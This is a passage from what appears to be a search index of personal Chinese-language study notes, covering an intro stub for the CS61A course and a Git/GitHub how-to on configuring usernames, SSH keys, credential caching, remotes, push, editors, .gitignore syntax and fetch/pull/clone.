<p>Abstract</p> <ul> <li>UC Berkeley CS61A: Structure and Interpretation of Computer Programs</li> <li>\u4e00\u95e8\u8ba1\u7b97\u673a\u5bfc\u8bba\u8bfe\u7a0b\uff0c\u4e3b\u8981\u60f3\u7528\u5b83\u5b66\u5b66 Python</li> </ul> <p>To Be Continued</p>"}, {"location": "Triviality/CS61A/Lec01/", "title": "Introdution", "text": "<p> \u7ea6 43 \u4e2a\u5b57 </p>"}, {"location": "Triviality/CS61A/Lec01/#python-values", "title": "Python Values", "text": "<ul> <li>Python has a rich set of values, including <ul> <li>Integers, Boolean(truth) values, Functinos</li> <li>Strings, Tuples, Ranges, Lists, Dictionaries, Sets</li> </ul> </li> </ul> ValuesLiterals(Denotations) <ul> <li>Integers<ul> <li>0, -1, 16, 13, 16</li> </ul> </li> <li>Boolean(truth) values<ul> <li>true, false</li> </ul> </li> <li>Functions<ul> <li>func f(x): \u2026</li> <li>func g(x): \u2026</li> </ul> </li> </ul>"}, {"location": "Triviality/GitHub/", "title": "Perface", "text": "<p> \u7ea6 65 \u4e2a\u5b57 </p> <p>Abstract</p> <ul> <li>\u4e00\u4e2a\u9762\u5411\u5f00\u6e90\u53ca\u79c1\u6709\u8f6f\u4ef6\u9879\u76ee\u7684\u6258\u7ba1\u5e73\u53f0(\u53ea\u652f\u6301 Git \u4f5c\u4e3a\u552f\u4e00\u7684\u7248\u672c\u5e93\u683c\u5f0f\u8fdb\u884c\u6258\u7ba1) </li> <li>\u4e3a\u89c4\u8303\u4f7f\u7528, \u66f4\u597d\u548c\u522b\u4eba\u534f\u4f5c\u9879\u76ee\u7279\u6765\u7cfb\u7edf\u4ed4\u7ec6\u770b\u4e00\u904d\u6280\u672f\u6587\u6863</li> </ul>"}, {"location": "Triviality/GitHub/Git/", "title": "Getting started with Git", "text": "<p> \u7ea6 2288 \u4e2a\u5b57  43 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>\u5b98\u65b9\u6587\u6863</p>"}, {"location": "Triviality/GitHub/Git/#set-your-username", "title": "Set your username", "text": "Set for every repositorySet for a single repository configcheck <pre><code>$ git config --global user.name \"MoLan\"\n</code></pre> <pre><code>$ git config --global user.name\n&gt; MoLan\n</code></pre> configcheck <pre><code>$ git config user.name \"MoLan\"\n</code></pre> <pre><code>$ git config user.name\n&gt; MoLan\n</code></pre> <p><code>email</code> \u8bbe\u7f6e\u540c\u7406\uff0c\u53ea\u9700\u5c06 <code>name</code> \u66ff\u6362\u4e3a <code>email</code> \u5373\u53ef</p>"}, {"location": "Triviality/GitHub/Git/#caching-credentials", "title": "Caching credentials", "text": "<p>\u5efa\u8bae\u76f4\u63a5\u7528 <code>ssh</code> \u514b\u9686</p> <ul> <li>\u4f7f\u7528 <code>HTTPS</code> \u514b\u9686\u4ed3\u5e93\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u5e2e\u52a9\u7a0b\u5e8f\u5728 Git \u4e2d\u7f13\u5b58 GitHub \u51ed\u636e</li> <li>\u5982\u679c\u662f\u4f7f\u7528 <code>ssh</code> \u514b\u9686\u4ed3\u5e93\uff0c\u5219\u4e0d\u9700\u8981\u51ed\u636e\u5e2e\u52a9\u7a0b\u5e8f</li> </ul> <p>More details</p>"}, {"location": "Triviality/GitHub/Git/#git-passordwords", "title": "Git passordwords", "text": "<ul> <li>\u4e00\u822c\u5728\u4f7f\u7528 <code>HTTPS</code> \u514b\u9686\u4ed3\u5e93\u65f6\uff0c\u4f1a\u8981\u6c42\u8f93\u5165 GitHub credentials (\u7528\u6237\u540d\u548c\u5bc6\u7801)</li> <li>\u4f46\u6b64\u65f6\u7684\u7528\u6237\u540d\u5bc6\u7801\u5e76\u975e GitHub \u8d26\u6237\u5bc6\u7801\uff0c\u800c\u662f GitHub personal access token</li> <li>\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e <code>Git</code> cache credentials \u6765\u907f\u514d\u6bcf\u6b21\u90fd\u8981\u6c42\u8f93\u5165 GitHub credentials<ul> <li>\u5728\u914d\u7f6e\u51ed\u636e\u7f13\u5b58\u540e\uff0c\u5f53\u4f7f\u7528 <code>HTTPS</code> \u62c9\u53d6\u6216\u63a8\u9001\u65f6\uff0cGit \u5c06\u81ea\u52a8\u4f7f\u7528\u7f13\u5b58\u7684 personal access token</li> </ul> </li> </ul>"}, {"location": "Triviality/GitHub/Git/#ssh-and-gpg-keys", "title": "SSH and GPG keys", "text": "<p>\u914d\u7f6e <code>ssh</code> \u516c\u94a5\uff0c\u53ef\u4ee5\u5728\u4e0d\u8f93\u5165 GitHub credentials \u7684\u60c5\u51b5\u4e0b\uff0c\u4e0e GitHub \u901a\u4fe1</p> \u7b80\u7ea6\u7248\u5b98\u65b9\u7248 <pre><code>$ ssh-keygen -t rsa -C \"email address\"\n# enter, enter ...\n</code></pre> <ul> <li>\u67e5\u770b\u516c\u94a5 <code>id_rsa.pub</code> \u6587\u4ef6</li> </ul> <pre><code>$ cat ~/.ssh/id_rsa.pub\n</code></pre> <ul> <li>\u5c06\u5176\u4e2d\u5185\u5bb9\u590d\u5236\u5230 GitHub \u7684 <code>SSH and GPG keys</code> \u4e2d</li> </ul> <p>Generating a new SSH key and adding it to the ssh-agent</p>"}, {"location": "Triviality/GitHub/Git/#macos-keychain-credentials", "title": "macOS Keychain credentials", "text": "<ul> <li>\u4ece macOS \u66f4\u65b0\u5bc6\u94a5\u94fe\u51ed\u636e\u4ec5\u4f7f\u7528\u5185\u7f6e\u5230 macOS \u4e2d\u7684 <code>osxkeychain</code> \u51ed\u636e\u5e2e\u52a9\u7a0b\u5e8f\u624b\u52a8\u914d\u7f6e\u4e86 personal access token \u7684\u7528\u6237</li> <li>\u8fd8\u662f\u5efa\u8bae\u4f7f\u7528 <code>ssh</code> \u6216\u8005 GCM | Git Credential Manager</li> </ul> \u901a\u8fc7 Keychain Access \u66f4\u65b0 credentials\u901a\u8fc7\u547d\u4ee4\u884c\u5220\u9664 credentials <ol> <li>\u6253\u5f00 <code>Keychain Access</code> \u5e94\u7528</li> <li>\u5728\u641c\u7d22\u6846\u4e2d\u8f93\u5165 <code>github.com</code></li> <li>\u67e5\u627e <code>github.com</code> \u7684 <code>Internet password</code> \u6761\u76ee</li> <li>\u7f16\u8f91\u6216\u5220\u9664\u6761\u76ee</li> </ol> <pre><code>$ git credential-osxkeychain erase\nhost=github.com\nprotocol=https\n&gt; [Press Return]\n</code></pre> <ul> <li>\u901a\u8fc7\u547d\u4ee4\u884c\u5220\u9664 credentials \u4f1a\u5220\u9664\u6240\u6709 GitHub \u51ed\u636e\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u5f53\u524d\u4ed3\u5e93\u6216\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e</li> <li>\u53ef\u4ee5\u5c1d\u8bd5\u514b\u9686\u4e13\u7528\u4ed3\u5e93\uff0c\u4ee5\u4fbf\u5728\u5220\u9664\u51ed\u636e\u540e\u6d4b\u8bd5\u662f\u5426\u4ecd\u9700\u8981\u8f93\u5165 GitHub \u51ed\u636e</li> </ul>"}, {"location": "Triviality/GitHub/Git/#git-workflows-todo", "title": "Git workflows \uff5c TODO", "text": ""}, {"location": "Triviality/GitHub/Git/#about-remote-repositories", "title": "About remote repositories", "text": "<p>\u5173\u4e8e\u8fdc\u7a0b\u4ed3\u5e93</p> <ul> <li>\u8fdc\u7a0b URL \u662f Git \u4e00\u79cd\u6307\u793a\u201c\u60a8\u7684\u4ee3\u7801\u5b58\u50a8\u4f4d\u7f6e\u201d\u7684\u7edd\u4f73\u65b9\u5f0f </li> <li>\u53ea\u80fd\u63a8\u9001\u4e24\u7c7b URL \u5730\u5740:  <ul> <li>HTTPS URL (\u4f8b\u5982 <code>https://github.com/user/repo.git</code>)</li> <li>SSH URL   (\u4f8b\u5982 <code>git@github.com:user/repo.git</code>)</li> </ul> </li> <li>Git \u5c06\u8fdc\u7a0b URL \u4e0e\u540d\u79f0\u76f8\u5173\u8054\uff0c\u9ed8\u8ba4\u8fdc\u7a0b\u901a\u5e38\u547d\u4e3a <code>origin</code></li> </ul>"}, {"location": "Triviality/GitHub/Git/#_1", "title": "\u521b\u5efa\u8fdc\u7a0b\u4ed3\u5e93", "text": "<p>\u53ef\u4ee5\u4f7f\u7528 <code>git remote add</code> \u547d\u4ee4\u5c06\u8fdc\u7a0b URL \u4e0e\u540d\u79f0\u5339\u914d</p> <p>Example</p> <p>git remote add origin  <p>\u5c06 origin \u4e0e <code>REMOTE_URL</code> \u5173\u8054</p>"}, {"location": "Triviality/GitHub/Git/#manage-remote-repositories", "title": "Manage remote repositories", "text": ""}, {"location": "Triviality/GitHub/Git/#_2", "title": "\u6dfb\u52a0\u8fdc\u7a0b\u4ed3\u5e93", "text": "<ul> <li>\u4f7f\u7528 <code>git remote add</code> \u5728\u7ec8\u7aef\u5b58\u50a8\u5b58\u50a8\u5e93\u7684\u76ee\u5f55\u4e2d\u65b0\u589e\u8fdc\u7a0b</li> <li><code>git remote add</code> \u91c7\u7528\u4e24\u4e2a\u53c2\u6570:<ul> <li>\u8fdc\u7a0b\u540d\u79f0 (\u5982 <code>origin</code>)</li> <li>\u8fdc\u7a0b URL (\u5982 <code>https://github.com/user/repo.git</code>)</li> </ul> </li> </ul> Example <pre><code>$ git remote add origin https://github.com/USER/REPO.git\n# Set a new remote\n\n$ git remote -v\n# Verify new remote\n&gt; origin  https://github.com/USER/REPO.git (fetch)\n&gt; origin  https://github.com/USER/REPO.git (push)\n</code></pre> Troubleshooting: Remote origin already exists <p>\u6b64\u9519\u8bef\u6d88\u606f\u8868\u793a\u5c1d\u8bd5\u6dfb\u52a0\u7684\u8fdc\u7a0b\u4e0e\u672c\u5730\u4ed3\u5e93\u8fdc\u7a0b\u540d\u79f0\u76f8\u540c <pre><code>$ git remote add origin https://github.com/octocat/Spoon-Knife.git\n&gt; fatal: remote origin already exists.\n</code></pre>  \u4e09\u79cd\u89e3\u51b3\u65b9\u6cd5:        1. \u5bf9\u65b0\u8fdc\u7a0b\u4f7f\u7528\u4e0d\u540c\u540d\u79f0       2. \u5728\u6dfb\u52a0\u65b0\u8fdc\u7a0b\u65f6\uff0c\u91cd\u547d\u540d\u73b0\u6709\u8fdc\u7a0b\u4ed3\u5e93       3. \u5728\u6dfb\u52a0\u65b0\u8fdc\u7a0b\u524d\uff0c\u5220\u9664\u73b0\u6709\u8fdc\u7a0b\u4ed3\u5e93</p>"}, {"location": "Triviality/GitHub/Git/#url", "title": "\u66f4\u6539\u8fdc\u7a0b\u4ed3\u5e93 URL", "text": "<ul> <li><code>git remote set-url</code> \u547d\u4ee4\u66f4\u6539\u73b0\u6709\u8fdc\u7a0b\u4ed3\u5e93 URL</li> <li>\u8be5\u547d\u4ee4\u91c7\u7528\u4e24\u4e2a\u53c2\u6570: <ul> <li>\u73b0\u6709\u8fdc\u7a0b\u4ed3\u5e93\u540d\u79f0\u3002\u5982\uff0c<code>origin</code> \u00b7\u00b7\u00b7</li> <li>\u8fdc\u7a0b\u4ed3\u5e93\u7684\u65b0 URL\u3002\u5982:<ul> <li>\u82e5\u8981\u66f4\u65b0\u4e3a\u4f7f\u7528 HTTPS\uff0cURL \u5f62\u5982 <code>https://github.com/USERNAME/REPOSITORY.git</code></li> <li>\u82e5\u8981\u66f4\u65b0\u4e3a\u4f7f\u7528 SSH\uff0cURL \u5f62\u5982 <code>git@github.com:USERNAME/REPOSITORY.git</code></li> </ul> </li> </ul> </li> </ul> \u5c06\u8fdc\u7a0b URL \u4ece SSH \u5207\u6362\u5230 HTTPS\u5c06\u8fdc\u7a0b URL \u4ece HTTPS \u5207\u6362\u5230 SSH <ol> <li>\u6253\u5f00 Git Bash || \u7ec8\u7aef</li> <li>\u5c06\u5f53\u524d\u76ee\u5f55\u66f4\u6539\u4e3a\u672c\u5730\u4ed3\u5e93</li> <li>\u5217\u51fa\u73b0\u6709\u4ed3\u5e93 <pre><code>$ git remote -v\n&gt; origin  git@github.com:USERNAME/REPOSITORY.git (fetch)\n&gt; origin  git@github.com:USERNAME/REPOSITORY.git (push)\n</code></pre></li> <li>\u4f7f\u7528 <code>git remote set-url</code> \u547d\u4ee4\u5c06\u8fdc\u7a0b URL \u4eceSSH \u66f4\u6539\u4e3a HTTPS <pre><code>$ git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n</code></pre></li> <li>\u9a8c\u8bc1 <pre><code>$ git remote -v\n# Verify new remote URL\n&gt; origin  https://github.com/USERNAME/REPOSITORY.git (fetch)\n&gt; origin  https://github.com/USERNAME/REPOSITORY.git (push)\n</code></pre> <p>\u4e0b\u6b21\u5c06 <code>git fetch</code>\u3001<code>git pull</code>\u3001<code>git push</code>\u6267\u884c\u5230\u8fdc\u7a0b\u5b58\u50a8\u5e93\u65f6\uff0c\u7cfb\u7edf\u5c06\u8981\u6c42\u63d0\u4f9b GitHub \u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u53ef\u4ee5\u4f7f\u7528 GitHub \u51ed\u636e\u5e2e\u52a9\u7a0b\u5e8f\uff0c\u4ee5\u4fbf Git \u6bcf\u6b21\u4e0e GitHub \u901a\u4fe1\u65f6\u90fd\u4f1a\u8bb0\u4f4f\u4f60\u7684 GitHub \u7528\u6237\u540d\u548c personal access token</p> </li> </ol> <ol> <li>\u6253\u5f00 Git Bash || \u7ec8\u7aef</li> <li>\u5c06\u5f53\u524d\u76ee\u5f55\u66f4\u6539\u4e3a\u672c\u5730\u4ed3\u5e93</li> <li>\u5217\u51fa\u73b0\u6709\u4ed3\u5e93 <pre><code>$ git remote -v\n&gt; origin  https://github.com/USERNAME/REPOSITORY.git (fetch)\n&gt; origin  https://github.com/USERNAME/REPOSITORY.git (push)\n</code></pre></li> <li>\u4f7f\u7528 <code>git remote set-url</code> \u547d\u4ee4\u5c06\u8fdc\u7a0b URL \u4ece HTTPS \u66f4\u6539\u4e3a SSH <pre><code>$ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git\n</code></pre></li> <li>\u9a8c\u8bc1 <pre><code>$ git remote -v\n# Verify new remote URL\n&gt; origin  git@github.com: USERNAME/REPOSITORY.git (fetch)\n&gt; origin  git@github.com: USERNAME/REPOSITORY.git (push)\n</code></pre> <p>\u4e0b\u6b21\u5c06 <code>git fetch</code>\u3001<code>git pull</code>\u3001<code>git push</code>\u6267\u884c\u5230\u8fdc\u7a0b\u5b58\u50a8\u5e93\u65f6\uff0c\u7cfb\u7edf\u5c06\u8981\u6c42\u63d0\u4f9b GitHub \u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u53ef\u4ee5\u4f7f\u7528 GitHub \u51ed\u636e\u5e2e\u52a9\u7a0b\u5e8f\uff0c\u4ee5\u4fbf Git \u6bcf\u6b21\u4e0e GitHub \u901a\u4fe1\u65f6\u90fd\u4f1a\u8bb0\u4f4f\u4f60\u7684 GitHub \u7528\u6237\u540d\u548c personal access token</p> </li> </ol>"}, {"location": "Triviality/GitHub/Git/#_3", "title": "\u91cd\u547d\u540d\u8fdc\u7a0b\u4ed3\u5e93", "text": "<ul> <li>\u4f7f\u7528 <code>git remote rename</code> \u547d\u4ee4\u91cd\u547d\u540d\u73b0\u6709\u8fdc\u7a0b</li> <li><code>git remote rename</code> \u547d\u4ee4\u91c7\u7528\u4e24\u4e2a\u53c2\u6570:<ul> <li>\u73b0\u6709\u8fdc\u7a0b\u540d\u79f0\uff08\u5982 original\uff09</li> <li>\u8fdc\u7a0b\u7684\u65b0\u540d\u79f0\uff08\u5982 destination\uff09</li> </ul> </li> </ul>"}, {"location": "Triviality/GitHub/Git/#_4", "title": "\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93", "text": "<ul> <li>\u4f7f\u7528 <code>git remote rm</code> \u547d\u4ee4\u4ece\u5b58\u50a8\u5e93\u4e2d\u5220\u9664\u8fdc\u7a0b URL\u3002</li> <li>\u8be5\u547d\u4ee4\u91c7\u7528\u4e00\u4e2a\u53c2\u6570\uff1a<ul> <li>\u8fdc\u7a0b\u540d\u79f0\uff08\u4f8b\u5982 destination\uff09</li> </ul> </li> </ul> <p>\u4ece\u5b58\u50a8\u5e93\u4e2d\u5220\u9664\u8fdc\u7a0b URL \u53ea\u4f1a\u53d6\u6d88\u672c\u5730\u548c\u8fdc\u7a0b\u5b58\u50a8\u5e93\u7684\u94fe\u63a5\u3002 \u5b83\u4e0d\u4f1a\u5220\u9664\u8fdc\u7a0b\u5b58\u50a8\u5e93</p>"}, {"location": "Triviality/GitHub/Git/#git-push", "title": "<code>git push</code>", "text": "<ul> <li><code>git push</code> \u4f1a\u5c06\u672c\u5730\u4ed3\u5e93\u7684\u5185\u5bb9\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93</li> <li><code>git push</code> \u547d\u4ee4\u91c7\u7528\u4e24\u4e2a\u53c2\u6570:<ul> <li>\u8fdc\u7a0b\u4ed3\u5e93\u7684\u540d\u79f0 (\u5982 <code>origin</code>)</li> <li>\u8981\u63a8\u9001\u7684\u5206\u652f\u7684\u540d\u79f0 (\u5982 <code>main</code>)</li> </ul> </li> <li><code>git push</code> \u547d\u4ee4\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5c06\u672c\u5730\u5206\u652f\u63a8\u9001\u5230\u4e0e\u4e4b\u5173\u8054\u7684\u8fdc\u7a0b\u5206\u652f</li> <li>\u4f8b\u5982\uff0c\u5982\u679c\u672c\u5730\u5206\u652f\u4e3a <code>main</code>\uff0c\u5219 <code>git push</code> \u5c06\u81ea\u52a8\u63a8\u9001\u5230\u8fdc\u7a0b\u5206\u652f <code>origin/main</code></li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>git push</code> \u547d\u4ee4\u7684 <code>--set-upstream</code> \u6807\u5fd7\u5c06\u672c\u5730\u5206\u652f\u4e0e\u8fdc\u7a0b\u5206\u652f\u5173\u8054\u8d77\u6765<ul> <li><code>git push --set-upstream origin main</code></li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>git push</code> \u547d\u4ee4\u7684 <code>--force</code> \u6807\u5fd7\u5f3a\u5236\u63a8\u9001\u5230\u8fdc\u7a0b\u5206\u652f<ul> <li><code>git push --force origin main</code></li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>git push</code> \u547d\u4ee4\u7684 <code>--all</code> \u6807\u5fd7\u63a8\u9001\u6240\u6709\u5206\u652f<ul> <li><code>git push --all origin</code></li> </ul> </li> </ul>"}, {"location": "Triviality/GitHub/Git/#associate-text-editors", "title": "Associate text editors", "text": "<ul> <li>\u914d\u7f6e <code>git config</code> \u4e2d\u7684 <code>core.editor</code> \u9009\u9879\uff0c\u53ef\u4ee5\u5c06\u6587\u672c\u7f16\u8f91\u5668\u4e0e Git \u5173\u8054</li> </ul> Mac | LinuxWindows VS CodeSublime Text <pre><code>$ git config --global core.editor \"code --wait\"\n</code></pre> <pre><code>$ git config --global core.editor \"subl -n -w\"\n</code></pre> VS CodeSublime Text <pre><code>$ git config --global core.editor \"code --wait\"\n</code></pre> <pre><code>$ git config --global core.editor \"'C:/Program Files/Sublime Text 3/subl.exe' -w\"\n</code></pre>"}, {"location": "Triviality/GitHub/Git/#handle-line-endings-todo", "title": "Handle line endings | TODO", "text": "<p>To avoid problems in your diffs, you can configure Git to properly handle line endings.</p>"}, {"location": "Triviality/GitHub/Git/#ignoring-files", "title": "Ignoring files", "text": "<ul> <li>\u5373\u914d\u7f6e <code>.gitignore</code> \u6587\u4ef6</li> <li>\u5982\u679c\u5728\u914d\u7f6e\u524d\u5df2\u7ecf\u63d0\u4ea4\u4e86\u67d0\u4e9b\u6587\u4ef6\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6587\u4ef6\u5c06\u4f1a\u88ab\u8ffd\u8e2a\uff0c\u5373\u4f7f\u5728 <code>.gitignore</code> \u4e2d\u914d\u7f6e\u4e86\u5ffd\u7565\u5b83\u4eec \u53ef\u4ee5\u4f7f\u7528 <code>git rm --cached FILENAME</code> \u547d\u4ee4\u6765\u53d6\u6d88\u8ffd\u8e2a\u8fd9\u4e9b\u6587\u4ef6</li> </ul> <p><code>.gitignore</code> \u4e2d\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u6587\u4ef6</p> <p>\u5728 .gitignore \u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e00\u884c\u7684\u5ffd\u7565\u89c4\u5219\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a</p> <ol> <li>\u7a7a\u683c\u4e0d\u5339\u914d\u4efb\u610f\u6587\u4ef6\uff0c\u53ef\u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u53ef\u7528\u53cd\u659c\u6760\u8f6c\u4e49</li> <li><code>#</code> \u6807\u8bc6\u6ce8\u91ca\uff0c\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u6760\u8fdb\u884c\u8f6c\u4e49</li> <li>\u53ef\u4ee5\u4f7f\u7528\u6807\u51c6\u7684 glob \u6a21\u5f0f\u5339\u914d\u3002\u6240\u8c13\u7684 glob \u6a21\u5f0f\u662f\u6307 shell \u6240\u4f7f\u7528\u7684\u7b80\u5316\u4e86\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</li> <li>\u4ee5\u659c\u6760 \u201c/\u201d \u5f00\u5934\u8868\u793a\u76ee\u5f55\uff1b\u201d/\u201d \u7ed3\u675f\u7684\u6a21\u5f0f\u53ea\u5339\u914d\u6587\u4ef6\u5939\u4ee5\u53ca\u5728\u8be5\u6587\u4ef6\u5939\u8def\u5f84\u4e0b\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u4e0d\u5339\u914d\u8be5\u6587\u4ef6\uff1b<ol> <li>\u201d/\u201d \u5f00\u59cb\u7684\u6a21\u5f0f\u5339\u914d\u9879\u76ee\u8ddf\u76ee\u5f55\uff1b</li> <li>\u5982\u679c\u4e00\u4e2a\u6a21\u5f0f\u4e0d\u5305\u542b\u659c\u6760\uff0c\u5219\u5b83\u5339\u914d\u76f8\u5bf9\u4e8e\u5f53\u524d <code>.gitignore</code> \u6587\u4ef6\u8def\u5f84\u7684\u5185\u5bb9\uff0c\u5982\u679c\u8be5\u6a21\u5f0f\u4e0d\u5728 <code>.gitignore</code> \u6587\u4ef6\u4e2d\uff0c\u5219\u76f8\u5bf9\u4e8e\u9879\u76ee\u6839\u76ee\u5f55</li> </ol> </li> <li>\u201d*\u201d \u901a\u914d\u591a\u4e2a\u5b57\u7b26<ul> <li>\u4f7f\u7528\u4e24\u4e2a\u661f\u53f7\u201d**\u201d \u8868\u793a\u5339\u914d\u4efb\u610f\u4e2d\u95f4\u76ee\u5f55\uff0c\u6bd4\u5982 <code>root/**/file</code> \u53ef\u4ee5\u5339\u914d <code>root/file</code>, <code>root/dir1/file</code> \u6216 <code>root/dir1/dir2/file</code> \u2026</li> </ul> </li> <li>\u201d?\u201d \u901a\u914d\u5355\u4e2a\u5b57\u7b26</li> <li>\u201d[]\u201d \u5339\u914d\u4efb\u4f55 \u4e00\u4e2a \u5217\u5728\u65b9\u62ec\u53f7\u4e2d\u7684\u5b57\u7b26\u3002\u6bd4\u5982 <code>[abc]</code> \u8868\u793a a \u6216 b \u6216 c\uff1b<ul> <li>\u5982\u679c\u5728\u65b9\u62ec\u53f7\u4e2d\u4f7f\u7528\u77ed\u5212\u7ebf\u5206\u9694\u4e24\u4e2a\u5b57\u7b26\uff0c\u8868\u793a\u6240\u6709\u5728\u8fd9\u4e24\u4e2a\u5b57\u7b26\u8303\u56f4\u5185\u7684\u90fd\u53ef\u4ee5\u5339\u914d\u3002\u6bd4\u5982 <code>[0-9]</code> \u8868\u793a\u5339\u914d\u6240\u6709 0 \u5230 9 \u7684\u6570\u5b57\uff0c<code>[a-z]</code> \u8868\u793a\u5339\u914d\u4efb\u610f\u7684\u5c0f\u5199\u5b57\u6bcd</li> </ul> </li> <li>\u201d!\u201d \u8868\u793a\u4e0d\u5ffd\u7565(\u8ddf\u8e2a)\u5339\u914d\u5230\u7684\u6587\u4ef6\u6216\u76ee\u5f55\uff0c\u5373\u8981\u5ffd\u7565\u6307\u5b9a\u6a21\u5f0f\u4ee5\u5916\u7684\u6587\u4ef6\u6216\u76ee\u5f55\uff0c\u53ef\u4ee5\u5728\u6a21\u5f0f\u524d\u52a0\u4e0a\u60ca\u53f9\u53f7\uff08!\uff09\u53d6\u53cd<ul> <li>\u5982\u679c\u6587\u4ef6\u7684\u7236\u76ee\u5f55\u5df2\u7ecf\u88ab\u524d\u9762\u7684\u89c4\u5219\u6392\u9664\u6389\u4e86\uff0c\u90a3\u4e48\u5bf9\u8fd9\u4e2a\u6587\u4ef6\u7528 \u201c!\u201d \u89c4\u5219\u662f\u4e0d\u8d77\u4f5c\u7528\u7684</li> </ul> </li> </ol> \u4e0d\u4f7f\u7528 .gitignore \u6587\u4ef6 <ul> <li>Excluding local files without creating a .gitignore file</li> <li>\u4e0d\u592a\u5efa\u8bae\u8fd9\u4e2a</li> </ul>"}, {"location": "Triviality/GitHub/Git/#trivial-commands-todo", "title": "Trivial commands | TODO", "text": "<p>\u57fa\u672c\u90fd\u53ef\u4ee5\u7528 <code>-h</code> \u67e5\u770b\u624b\u518c</p> diff <ul> <li><code>git diff</code> \u67e5\u770b\u5de5\u4f5c\u533a\u548c\u6682\u5b58\u533a\u4e4b\u95f4\u6240\u6709\u7684\u6587\u4ef6\u5dee\u5f02</li> </ul> <p>CSDN - git diff</p> fetch &amp; pull <ul> <li><code>git pull</code> = <code>git fetch</code> + <code>git merge</code></li> <li>\u5efa\u8bae\u4f18\u5148\u4f7f\u7528 <code>git fetch</code>\uff0c\u56e0\u4e3a <code>git pull</code> \u4f1a\u81ea\u52a8\u5408\u5e76\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u51b2\u7a81</li> <li><code>pull</code><ul> <li><code>git pull</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u7684\u5185\u5bb9\u62c9\u53d6\u5230\u672c\u5730</li> <li><code>git pull &lt;remote&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>&lt;remote&gt;</code> \u5206\u652f\u62c9\u53d6\u5230\u672c\u5730</li> <li><code>git pull &lt;\u8fdc\u7a0b\u4e3b\u673a\u540d&gt; &lt;\u8fdc\u7a0b\u5206\u652f\u540d&gt;:&lt;\u672c\u5730\u5206\u652f\u540d&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>&lt;\u8fdc\u7a0b\u4e3b\u673a\u540d&gt;</code> \u7684 <code>&lt;\u8fdc\u7a0b\u5206\u652f\u540d&gt;</code> \u5206\u652f\u62c9\u53d6\u5230\u672c\u5730\u7684 <code>&lt;\u672c\u5730\u5206\u652f\u540d&gt;</code> \u5206\u652f\u5e76\u5408\u5e76 (e.g. <code>git pull origin main:version1</code>)</li> <li>\u2026</li> </ul> </li> <li><code>fetch</code> \u64cd\u4f5c\u4e0e <code>pull</code> \u7c7b\u4f3c</li> </ul> <p>\u4e00\u4e2a\u8f83\u5b89\u5168\u7684\u62c9\u53d6\u6d41\u7a0b</p> <pre><code>$ git fetch origin main:tmp\n$ git diff tmp\n$ git merge tmp\n</code></pre> clone <ul> <li><code>git clone &lt;url&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u514b\u9686\u5230\u672c\u5730</li> <li><code>git clone &lt;url&gt; &lt;dir&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u514b\u9686\u5230\u672c\u5730\u7684 <code>&lt;dir&gt;</code> \u76ee\u5f55\u4e0b</li> <li><code>git clone &lt;url&gt; -b &lt;branch&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>&lt;branch&gt;</code> \u5206\u652f\u514b\u9686\u5230\u672c\u5730</li> <li><code>git clone &lt;url&gt; -b &lt;branch&gt; &lt;dir&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>&lt;branch&gt;</code> \u5206\u652f\u514b\u9686\u5230\u672c\u5730\u7684 <code>&lt;dir&gt;</code> \u76ee\u5f55\u4e0b</li> <li><code>git clone &lt;url&gt; -b &lt;branch&gt; --single-branch</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>&lt;branch&gt;</code> \u5206\u652f\u514b\u9686\u5230\u672c\u5730\uff0c\u4e14\u53ea\u514b\u9686\u8be5\u5206\u652f</li> <li><code>depth</code> \u9009\u9879:<ul> <li><code>git clone &lt;url&gt; --depth &lt;depth&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u514b\u9686\u5230\u672c\u5730\uff0c\u4f46\u662f\u53ea\u514b\u9686\u6700\u8fd1\u7684 <code>&lt;depth&gt;</code> \u4e2a\u63d0\u4ea4</li> </ul> </li> <li><code>shallow</code> \u9009\u9879:<ul> <li><code>git clone &lt;url&gt; --shallow-since=&lt;date&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u514b\u9686\u5230\u672c\u5730\uff0c\u4f46\u662f\u53ea\u514b\u9686\u6700\u8fd1\u7684 <code>&lt;date&gt;</code> \u4e4b\u540e\u7684\u63d0\u4ea4</li> <li><code>git clone &lt;url&gt; --shallow-exclude=&lt;revision&gt;</code> \u4f1a\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u514b\u9686\u5230\u672c\u5730\uff0c\u4f46\u662f\u4e0d\u514b\u9686 <code>&lt;revision&gt;</code> 